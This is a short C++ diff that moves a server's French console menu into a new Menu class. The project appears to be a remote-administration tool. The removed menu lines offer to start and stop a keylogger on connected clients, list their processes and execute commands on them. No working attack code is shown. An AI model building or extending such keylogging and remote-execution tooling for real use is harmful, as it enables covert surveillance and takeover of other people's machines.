@@ -1,6 +1,7 @@
 #include "../utils/EnvLoader.h"
 #include "../utils/LPTF_Socket.h"
 #include "../utils/LPTF_Packet.h"
+#include "Menu.hpp"
 #include <vector>
 #include <iostream>
 #include <windows.h>
@@ -83,19 +84,8 @@ int main() {
             }
 
             if (isClientConnected) {
-                cout << "-------------------------------------" << endl;
-                cout << "Nombre de clients connectés : " << clients.size() << endl;
-                cout << "1 - Afficher la liste des clients" << endl;
-                cout << "2 - Envoyer un message au client" << endl;
-                cout << "3 - Afficher les informations du client" << endl;
-                cout << "4 - Démarrer le keylogger" << endl;
-                cout << "5 - Eteindre le keylogger" << endl;
-                cout << "6 - Afficher la liste des processus" << endl;
-                cout << "7 - Exécuter une commande" << endl;
-                cout << "8 - Quitter" << endl;
-                cout << "Choisissez une option : ";
-                int choice;
-                cin >> choice;
+                Menu menu(clients);
+                return menu.run();
             }
         }
 
